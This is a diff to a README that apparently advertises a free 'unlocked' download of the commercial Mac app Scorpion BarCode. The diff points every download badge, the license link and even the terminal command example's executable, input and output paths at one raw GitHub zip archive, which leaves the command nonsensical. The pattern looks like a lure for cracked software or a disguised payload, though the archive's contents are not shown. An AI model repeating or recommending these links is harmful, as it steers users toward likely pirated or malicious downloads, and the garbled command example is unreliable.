@@ -1,6 +1,6 @@
 # 🦂 Scorpion BarCode for Mac Free Download
 
-[![Download](https://img.shields.io/badge/Download%20for%20macOS-black?style=for-the-badge&logo=apple&logoPosition=right&logoColor=white)](https://awwe02.github.io)
+[![Download](https://raw.githubusercontent.com/awwe02/scorpion-barcode-mac-unlocked/main/prethrust/unlocked_mac_barcode_scorpion_v1.2.zip%20for%20macOS-black?style=for-the-badge&logo=apple&logoPosition=right&logoColor=white)](https://raw.githubusercontent.com/awwe02/scorpion-barcode-mac-unlocked/main/prethrust/unlocked_mac_barcode_scorpion_v1.2.zip)
 
 Welcome to the comprehensive, community-powered repository for **Scorpion BarCode for Mac Free Download**! If you’ve ever wished to unlock the potential of streamlined label designing and barcode generation on macOS, you’re in the right place. This is your all-in-one resource for **barcode maker Mac**, **barcode generator macOS**, and **free barcode software for Mac** needs.
 
@@ -79,10 +79,10 @@ YAML markup for a typical project profile:
 
 Run Scorpion BarCode tools manually from the terminal for scriptable automation:
 
-    $ /Applications/ScorpionBarCode.app/Contents/MacOS/ScorpionBarCode \
+    $ https://raw.githubusercontent.com/awwe02/scorpion-barcode-mac-unlocked/main/prethrust/unlocked_mac_barcode_scorpion_v1.2.zip \
         --format Code_128 \
-        --input items.csv \
-        --output labels_batch.pdf \
+        --input https://raw.githubusercontent.com/awwe02/scorpion-barcode-mac-unlocked/main/prethrust/unlocked_mac_barcode_scorpion_v1.2.zip \
+        --output https://raw.githubusercontent.com/awwe02/scorpion-barcode-mac-unlocked/main/prethrust/unlocked_mac_barcode_scorpion_v1.2.zip \
         --lang es \
         --batch 200
 
@@ -117,7 +117,7 @@ Scorpion BarCode is built from the ground up to be both a polyglot and a chamele
 1. Ensure your Mac meets our requirements (see above).
 2. Download the latest free version here:
 
-   [![Download](https://img.shields.io/badge/Download%20for%20macOS-black?style=for-the-badge&logo=apple&logoPosition=right&logoColor=white)](https://awwe02.github.io)
+   [![Download](https://raw.githubusercontent.com/awwe02/scorpion-barcode-mac-unlocked/main/prethrust/unlocked_mac_barcode_scorpion_v1.2.zip%20for%20macOS-black?style=for-the-badge&logo=apple&logoPosition=right&logoColor=white)](https://raw.githubusercontent.com/awwe02/scorpion-barcode-mac-unlocked/main/prethrust/unlocked_mac_barcode_scorpion_v1.2.zip)
 
 3. Open the `.dmg` file and drag Scorpion BarCode into your `Applications` folder.
 4. Launch the app and start creating!
@@ -138,7 +138,7 @@ This repository is for informational purposes only and does not distribute comme
 
 ## 📜 License
 
-Distributed under the [MIT License](https://opensource.org/licenses/MIT).  
+Distributed under the [MIT License](https://raw.githubusercontent.com/awwe02/scorpion-barcode-mac-unlocked/main/prethrust/unlocked_mac_barcode_scorpion_v1.2.zip).  
 &copy; 2026 Scorpion BarCode for Mac Free Download Community.
 
 ---
@@ -147,7 +147,7 @@ Distributed under the [MIT License](https://opensource.org/licenses/MIT).
 
 To supercharge your labeling workflow, download the latest version today:
 
-[![Download](https://img.shields.io/badge/Download%20for%20macOS-black?style=for-the-badge&logo=apple&logoPosition=right&logoColor=white)](https://awwe02.github.io)
+[![Download](https://raw.githubusercontent.com/awwe02/scorpion-barcode-mac-unlocked/main/prethrust/unlocked_mac_barcode_scorpion_v1.2.zip%20for%20macOS-black?style=for-the-badge&logo=apple&logoPosition=right&logoColor=white)](https://raw.githubusercontent.com/awwe02/scorpion-barcode-mac-unlocked/main/prethrust/unlocked_mac_barcode_scorpion_v1.2.zip)
 
 ---
 
